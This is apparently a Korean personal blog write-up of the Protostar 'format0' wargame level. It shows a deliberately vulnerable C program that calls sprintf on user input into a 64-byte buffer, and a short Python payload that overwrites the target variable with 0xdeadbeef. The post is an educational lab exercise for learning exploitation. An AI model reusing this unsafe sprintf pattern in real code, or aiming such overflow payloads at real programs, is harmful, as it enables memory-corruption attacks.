---
layout: post
title: "[exploit-exercise][protostar] format0"
date: 2016-09-16 01:10:00
category: wargame
tags:  [exploit-exercise, fsb]
---

Format String 을 좀더 공부하기 위하여 exploit-exercise/protostar 도 풀어보기 도전...
[Protostar Format0 - Exploit Exercises](https://exploit-exercises.com/protostar/format0/)

- This level should be done in less than 10 bytes of input.
- “Exploiting format string vulnerabilities”

<!--more--> 

## Code 

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln(char *string)
{
  volatile int target;
  char buffer[64];

  target = 0;

  sprintf(buffer, string);
  
  if(target == 0xdeadbeef) {
      printf("you have hit the target correctly :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```


## Solve

먼저 시도한 exploit 은 BoF 에서 많이 사용하던 아래와 같은 패턴인데 계속 error 가 발생하는거다. 왜지 ?

```bash
$ python -c 'print "A"*64 + "\xef\xbe\xad\xde"' |./format0
close failed in file object destructor:
Error in sys.excepthook:

Original exception was:   
```

근데, 뭐가 문제인지 잘 모르겠다.
[python - Addressing sys.excepthook error in bash script - Stack Overflow](http://stackoverflow.com/questions/7955138/addressing-sys-excepthook-error-in-bash-script)


## Exploit

Error 가 나서 `|` 대신에 argument 로 넘기니깐 동작하네... 

```bash
$ ./format0 $(python -c 'print "A"*64 + "\xef\xbe\xad\xde"')
you have hit the target correctly :) 
```

근데 이것은 BoF 랑 차이점이 뭐지 ?
